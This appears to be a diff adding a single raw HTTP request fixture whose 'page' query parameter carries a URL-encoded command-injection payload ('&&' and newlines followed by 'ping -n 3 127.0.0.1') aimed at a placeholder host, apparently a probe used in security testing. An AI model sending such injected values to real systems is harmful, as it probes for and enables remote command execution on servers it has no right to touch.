@@ -1,0 +1,4 @@
+GET /a?page=%26%26%0aping%0a-n%0a3%0a127.0.0.1 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
